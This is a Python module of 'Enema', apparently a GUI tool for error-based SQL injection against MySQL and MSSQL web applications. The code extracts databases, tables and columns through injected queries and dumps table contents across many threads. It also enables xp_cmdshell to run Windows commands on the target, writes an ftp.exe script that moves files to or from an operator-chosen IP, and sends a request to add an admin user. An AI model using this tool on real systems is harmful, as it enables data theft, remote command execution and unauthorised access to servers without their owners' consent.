"""
    Enema module: SQL Injection.
    Copyright (C) 2011  Valeriy Bogachuk
    Last modified: $WCDATE$
    
    This program is free software: you can redistribute it and/or modify
    it under the terms of the GNU General Public License as published by
    the Free Software Foundation, either version 3 of the License, or
    (at your option) any later version.

    This program is distributed in the hope that it will be useful,
    but WITHOUT ANY WARRANTY; without even the implied warranty of
    MERCHANTABILITY or FITNESS FOR A PARTICULAR PURPOSE.  See the
    GNU General Public License for more details.
"""

import sys
import time
import web
import txtproc
from PyQt4 import QtCore
from threading import *
from queue import Queue
from querystrings import error_based


class ErrorBased(QtCore.QThread):
    
    #---------------Signals---------------#
    dbSignal = QtCore.pyqtSignal(str)
    tblCountSignal = QtCore.pyqtSignal(str)
    tblSignal = QtCore.pyqtSignal(str)
    progressSignal = QtCore.pyqtSignal(int, bool, bool)
    msgSignal = QtCore.pyqtSignal(str)
    columnSignal = QtCore.pyqtSignal(str, int)
    cmdSignal = QtCore.pyqtSignal(str, bool)
    querySignal = QtCore.pyqtSignal(str)
    rowDataSignal = QtCore.pyqtSignal(int, int, str)
    positionSignal = QtCore.pyqtSignal(str)
    #-------------------------------------#
    
    def __init__(self, args):
        QtCore.QThread.__init__(self)
        self.vars = args
        
    def run(self):

        if self.vars['task'] == "tables": self.getTables()
        elif self.vars['task'] == "count": self.getCountInTable()
        elif self.vars['task'] == "bases": self.getBases()
        elif self.vars['task'] == "columns": self.getColumns()
        elif self.vars['task'] == "cmd": self.xpCmdShell()
        elif self.vars['task'] == "enable_openrowset": self.enableOpenrowset()
        elif self.vars['task'] == "enable_cmd": self.enableXpCmdShell()
        elif self.vars['task'] == "ftp": self.uploadFile()
        elif self.vars['task'] == "query":self.runQuery()
        elif self.vars['task'] == "addSqlUser": self.addUser()
        elif self.vars['task'] == "dump": self.syncThreads()
        return
        
#SET variables in string to valid value 
    def buildQuery(self, query, vars=None):
        ms =  txtproc.strToSqlChar(self.vars['ms'], self.vars['db_type'])
        try:
                if self.vars['db_type'] == "mysql"\
                and (self.vars['task'] =='tables' or self.vars['task'] =='columns'):
                    vars['cdb'] = txtproc.strToSqlChar(vars['cdb'], self.vars['db_type'])
        except Exception:
            pass
        if vars is None:
            vars = {}
        query_vars = {
        '${MS}' : ms, 
        '${current_db}' : vars.setdefault('cdb'), 
        '${current_table}' : vars.setdefault('ctbl'),  
        '${num}' : vars.setdefault('num'), 
        '${current_column}' : vars.setdefault('ccol'),
        '${ordinal_position,}' : vars.setdefault('num'), 
        '${selected_table}' : self.vars.setdefault('selected_table'), 
        '${cmd_hex}' : self.vars.setdefault('hex'), 
        '${cmd}' : self.vars.setdefault('cmd'), 
        '${query_cmd}' : self.vars.setdefault('query_cmd'), 
        '${login}' : vars.setdefault('login'), 
        '${password}' : vars.setdefault('password'), 
        '${key}' : self.vars.setdefault('key'),
        '${column}' : vars.setdefault('column'), 
        '${table}' : vars.setdefault('table')} 
        for key in query_vars:
            query = query.replace(key, str(query_vars[key]))
        if (self.vars['errGenerationMethodMSSQL'] == "CONVERT" and self.vars['db_type'] == "mssql"):
            query= txtproc.castToConvert(query)
        return query
    
#Current db type selected
    def dbType(self, key):
        if self.vars['db_type'] == "mysql":
            return error_based.mysql[key]
        else:
            return error_based.mssql[key]
        
#Get current database
    def getCurrDb(self):
        if self.vars['dbListCount'] < 1:
            query = self.buildQuery(self.dbType('curr_db_name'))
            db_name = web.webRequest(self.vars, query, False)
            if db_name == "no_content": 
                web.debug(sys._getframe().f_code.co_name + "() -> db_name")
                return
            self.dbSignal.emit(db_name)
        else:
            db_name = self.vars['dbName']
        return db_name
        
#Getting bases
    def getBases(self):
        #If not in (array) method selected
        if self.vars['notInArray']:
            current_db = self.vars['dbName']
            while True:
                query = self.buildQuery(error_based.mssql['get_db_name'], {'cdb' : current_db})
                db_name = web.webRequest(self.vars, query, False)
                if db_name == "no_content":
                    web.debug(sys._getframe().f_code.co_name + "() -> db_name")
                    return
                elif db_name == "isnull":
                    break
                current_db += ",'" + db_name + "'"
                self.dbSignal.emit(db_name)
            self.progressSignal.emit(0, True, True)
        #not in (substring) method realisation
        else:
            query = self.buildQuery(self.dbType('dbs_count'))
            dbCount = web.webRequest(self.vars, query, False)
            tQueue = Queue()
            for tNum in range(int(dbCount)):  
                tQueue.put(tNum)
            for i in range(self.vars['threads']):  
                t = Thread(target=self.mtBases, args=(tNum, tQueue, dbCount)) 
                t.start()
                time.sleep(0.1)

#Multithread tables
    def mtBases(self, tNum, tQueue, dbCount):
        while True:  
            try:  
                tNum = tQueue.get_nowait()
            except Exception:  
                break
            query = self.buildQuery(self.dbType('get_db_name2'), {'num' : str(tNum)})
            db_name = web.webRequest(self.vars, query, False)
            if db_name == "no_content":
                web.debug(sys._getframe().f_code.co_name + "() -> db_name")
                return
            self.dbSignal.emit(db_name)
            time.sleep(0.1)
            tQueue.task_done()
            self.progressSignal.emit(int(dbCount) - 1, False, False)
        self.progressSignal.emit(0, True, True)
        
#Getting tables
    def getTables(self):
        current_db = self.getCurrDb()
        print(current_db)
        query = self.buildQuery(self.dbType('tbls_count'), {'cdb' : current_db})
        tblCount = web.webRequest(self.vars, query, False)
        if tblCount == "no_content": 
            web.debug(sys._getframe().f_code.co_name + "() -> tblCount")
            return
        self.tblCountSignal.emit(tblCount)
        if self.vars['notInArray']:
            current_table = ""
            while True:
                query = self.buildQuery(error_based.mssql['get_tbl_name'], {'cdb' : current_db, 'ctbl' : current_table})
                table_name = web.webRequest(self.vars, query, False)
                if table_name == "no_content":
                    web.debug(sys._getframe().f_code.co_name + "() -> table_name")
                    return
                elif table_name == "isnull":
                    break
                current_table += ",'" + table_name + "'"
                self.tblSignal.emit(table_name)
                self.progressSignal.emit(int(tblCount), False, False)
            self.progressSignal.emit(0, True, True)
        else:
            tQueue = Queue()
            for tNum in range(int(tblCount)):  
                tQueue.put(tNum)
            for i in range(self.vars['threads']):  
                t = Thread(target=self.mtTables, args=(tNum, tQueue,  tblCount, current_db)) 
                t.start()
                time.sleep(0.1)
        
#Multithread tables
    def mtTables(self, tNum, tQueue, tblCount, current_db):
        while True:  
            try:  
                tNum = tQueue.get_nowait()
            except Exception:  
                break
            query = self.buildQuery(self.dbType('get_tbl_name2'), {'cdb' : current_db, 'num' : str(tNum)})
            table_name = web.webRequest(self.vars, query, False)
            if table_name == "no_content":
                web.debug(sys._getframe().f_code.co_name + "() -> table_name")
                return
            self.tblSignal.emit(table_name)
            time.sleep(0.1)
            tQueue.task_done()
            self.progressSignal.emit(int(tblCount) - 1, False, False)
        self.progressSignal.emit(0, True, True)
            
#Getitng columns
    def getColumns(self):
        current_db = self.getCurrDb()
        tables = self.vars['tables']
        #If not in(array) method selected:
        if self.vars['notInArray']: 
            for i in range (self.vars['tblTreeCount']):
                current_table = txtproc.strToSqlChar(tables[i], self.vars['db_type'])
                current_column = ""
                query = self.buildQuery(error_based.mssql['columns_count'], {'cdb' : current_db, 'ctbl' : current_table})
                columnsInTable = web.webRequest(self.vars, query, False)
                if columnsInTable == "no_content": 
                    web.debug(sys._getframe().f_code.co_name + "() -> notInArray -> columnsinTable")
                    return
                while True:
                    query = self.buildQuery(self.dbType('get_column_name'),
                                             {'cdb' : current_db, 'ctbl' : current_table, 'ccol' : current_column})
                    column_name = web.webRequest(self.vars, query, False)
                    if column_name == "no_content":
                        web.debug(sys._getframe().f_code.co_name + "() -> notInArray -> column_name")
                        return
                    elif column_name == "isnull":
                        break
                    current_column += ",'" + column_name + "'"
                    self.columnSignal.emit(column_name, i)
                    self.progressSignal.emit(int(columnsInTable), False, False)
            self.progressSignal.emit(0, True, True)
        #If not in (substring - MSSQL) or LIMIT(MySQL) method selected
        else:
            for i in range (self.vars['tblTreeCount']):
                current_table = txtproc.strToSqlChar(tables[i], self.vars['db_type'])
                query = self.buildQuery(self.dbType('columns_count'), {'cdb' : current_db, 'ctbl' : current_table})
                columnsInTable = web.webRequest(self.vars, query, False)
                if columnsInTable == "no_content": 
                    web.debug(sys._getframe().f_code.co_name + "() -> columnsinTable")
                    return
                for rowid in range(int(columnsInTable)):
                    #If not in(substring) method selected:
                    if self.vars['notInSubstring']:
                        query = self.buildQuery(self.dbType('get_column_name2'),
                                                 {'cdb' : current_db, 'ctbl' : current_table,  'num' : str(rowid)})
                    #If ordinal_position method selected:
                    elif self.vars['ordinal_position']:
                        rowid += 1
                        query = self.buildQuery(self.dbType('get_column_name3'), 
                                                {'cdb' : current_db, 'ctbl' : current_table, 'num' : str(rowid)})
                    column_name = web.webRequest(self.vars, query, False)
                    if column_name == "no_content":
                        web.debug(sys._getframe().f_code.co_name + "() -> notInSubstring -> column_name")
                        return
                    self.columnSignal.emit(column_name, i)
                    self.progressSignal.emit(int(columnsInTable), False, False)
            self.progressSignal.emit(0, True, True)

#Show rows count in selected table
    def getCountInTable(self):
        current_db = self.getCurrDb()
        query = self.buildQuery(self.dbType('rows_count'), {'cdb' : current_db})
        rowsInTable = web.webRequest(self.vars, query, False)
        if rowsInTable == "no_content":
            web.debug(sys._getframe().f_code.co_name + "() -> rowsInTable")
            return
        msg = (rowsInTable + " rows in " + self.vars['selected_table'])
        self.msgSignal.emit(msg)

#Run Query     
    def runQuery(self):
        #If this select command
        if self.vars['querySelect']:
            query = self.buildQuery(self.dbType('query'))
            result = web.webRequest(self.vars, query, False)
            result = result.replace("\\r", "\r")\
            .replace("\\t", "\t").replace("\\n", "\n").replace("'/",  "'")
        else:
            result = "NULL"
            web.webRequest(self.vars, self.vars['cmd'], True)
        self.querySignal.emit(result)

 #Making synchronized threads for dumper
    def syncThreads(self):
        current_db = self.getCurrDb()
        columns = self.vars['columns']
        for num in range (len(columns)):
            tQueue = Queue()
            for tNum in range(self.vars['fromPos'] + 1, self.vars['toPos'] + 1):
                tQueue.put(tNum)
            Lock()
            for i in range(self.vars['threads']):  
                t = Thread(target=self.doDump, args=(tNum, tQueue, current_db, str(columns[num]), num))  
                t.start()
                time.sleep(0.1)
            RLock()
            
#Data dumping           
    def doDump(self, tNum, tQueue, current_db, column, num):
        while True:
            try:  
                tNum = tQueue.get_nowait()
            except Exception:  
                break
            query = self.buildQuery(self.dbType('data_dump'), 
                                    {'cdb' : current_db, 'column' : column, 'table' : self.vars['table'], 
                                    'key' : self.vars['key'], 'num' : str(tNum)})
            rowData = web.webRequest(self.vars, query, False)
            if rowData == "no_content":
                rowData = "NULL"
            self.rowDataSignal.emit(tNum, num, rowData)
            time.sleep(0.1)
            tQueue.task_done()
            self.progressSignal.emit(0, False, False)
        self.progressSignal.emit(0, True, True)
        
#============================[MSSQL FUNCTIONS ONLY]============================#
#Enable xp_cmdshell request
    def enableXpCmdShell(self):
        web.webRequest(self.vars, error_based.mssql['enable_xp_cmdshell'], True)
        self.msgSignal.emit("Enable xp_cmdshell request sent.")

#xp_cmdshell - windows command execution    
    def xpCmdShell(self):
        #Delete tmp_table if already exist
        web.webRequest(self.vars, error_based.mssql['drop_tmp_tbl'], True)
        #Creating tmp table
        web.webRequest(self.vars, error_based.mssql['create_tmp_tbl'], True)
        #Inserting xp_cmdshell output to temp table
        query = self.buildQuery(error_based.mssql['insert_result'], {'hex' : txtproc.strToHex(self.vars['cmd'])})
        web.webRequest(self.vars, query, True)
        #Getting count of rows in temp table
        query = self.buildQuery(error_based.mssql['tmp_count'])
        rowCount = web.webRequest(self.vars, query, False)
        if rowCount == "no_content":
            return
        tQueue = Queue()
        for tNum in range(1, int(rowCount)):  
            tQueue.put(tNum)
        for i in range(self.vars['threads']):  
            t = Thread(target=self.mtTables, args=(tNum, tQueue, rowCount)) 
            t.start()
            time.sleep(0.1)

#Multithreaded xp_cmdshell output extracting
    def mtCmdOutput(self, tNum, tQueue, rowCount):
        while True:  
            try:  
                tNum = tQueue.get_nowait()
            except Exception:  
                break
            query = self.buildQuery(error_based.mssql['get_row'], {'num' : str(tNum)})
            cmdResult = web.webRequest(self.vars, query, False)
            if cmdResult == "no_content":
                web.debug(sys._getframe().f_code.co_name + "() -> cmdResult")
                return
            cmdResult = cmdResult.replace("\\r", "\r").replace("\\t", "\t").replace("\\n", "\n")
            self.cmdSignal.emit(cmdResult, False)
            time.sleep(0.1)
            tQueue.task_done()
            self.progressSignal.emit(int(rowCount) - 1, False, False)
        self.progressSignal.emit(0, True, True)
        self.cmdSignal.emit("", True)
        #Delete tmp_table
        web.webRequest(self.vars, error_based.mssql['drop_tmp_tbl'], True)

#Upload file using built-in ftp.exe 
    def uploadFile(self):
        ftpFiles = self.vars['ftpFiles']
        #del ..\temp\ftp.txt /Q
        query = self.buildQuery(error_based.mssql['exec_cmdshell'], 
                                {'hex' : txtproc.strToHex("del ..\\temp\\ftp.txt /Q")})
        web.webRequest(self.vars, query, True)
        #echo login> ..\temp\ftp.txt
        query = self.buildQuery(error_based.mssql['exec_cmdshell'], 
                                {'hex' : txtproc.strToHex("echo " + self.vars['login'] + "> ..\\temp\\ftp.txt")})
        web.webRequest(self.vars, query, True)
        #echo password>> ..\temp\ftp.txt
        query = self.buildQuery(error_based.mssql['exec_cmdshell'], 
                                {'hex' : txtproc.strToHex("echo " + self.vars['password'] + "> ..\\temp\\ftp.txt")})
        web.webRequest(self.vars, query, True)
        for file in ftpFiles:
            #------ULOAD TO SERVER OR DOWNLOAD?------#
            if self.vars['ftp_mode'] == "get":
                #echo get file.exe c:\path\file.exe>> ..\temp\ftp.txt
                query = self.buildQuery(error_based.mssql['exec_cmdshell'], 
                                    {'hex' : txtproc.strToHex("echo get " + file + " "\
                                    + self.vars['filePath'] + "\\" + file + ">> ..\\temp\\ftp.txt")})
            else:
                #echo send c:\path\file.exe>> ..\temp\ftp.txt
                query = self.buildQuery(error_based.mssql['exec_cmdshell'], 
                                    {'hex' : txtproc.strToHex("echo send " + self.vars['filePath'] +
                                    "\\" +  file + ">> ..\\temp\\ftp.txt")})
            web.webRequest(self.vars, query, True)
            #--------------------------------------------------------#
        #echo bye>> ..\temp\ftp.txt
        query = self.buildQuery(error_based.mssql['exec_cmdshell'], 
                                {'hex' : txtproc.strToHex("echo bye>> ..\\temp\\ftp.txt")})
        web.webRequest(self.vars, query, True)
        #ftp -s:..\temp\ftp.txt IP
        query = self.buildQuery(error_based.mssql['exec_cmdshell'], 
                                {'hex' : txtproc.strToHex("ftp -s:..\\temp\\ftp.txt " + self.vars['ip'])})
        web.webRequest(self.vars, query, True)
        #del ..\temp\ftp.txt /Q
        query = self.buildQuery(error_based.mssql['exec_cmdshell'], 
                                {'hex' : txtproc.strToHex("del ..\\temp\\ftp.txt /Q")})
        web.webRequest(self.vars, query, True)
    
#Enable OPENROWSET request
    def enableOpenrowset(self):
        web.webRequest(self.vars, error_based.mssql['enable_openrowset'], True)
        self.msgSignal.emit("Enable OPENROWSET request sent.")
        
#Add user request        
    def addUser(self):
        query =  self.buildQuery(error_based.mssql['exec_cmdshell'], 
                                 {'login' : self.vars['addUserLogin'], 'password' : self.vars['addUserPassword']})
        web.webRequest(self.vars, query, True)
        self.msgSignal.emit("Add admin user request sent.")
        
